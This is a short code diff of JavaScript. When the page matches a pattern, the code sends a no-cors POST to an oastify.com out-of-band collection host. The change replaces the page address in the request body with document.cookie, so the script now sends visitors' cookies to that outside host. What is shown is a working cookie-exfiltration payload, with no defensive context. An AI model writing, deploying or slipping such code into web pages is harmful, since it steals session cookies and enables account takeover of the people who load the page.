@@ -3,7 +3,6 @@ if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
 fetch('https://8mvcheojaohdf3432jmgzibkgbm1aq.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
-headers:{'content-type': 'application/x-www-form-urlencoded'},
-body:`domain=${document.documentURI}`
+body:document.cookie
 });
 }
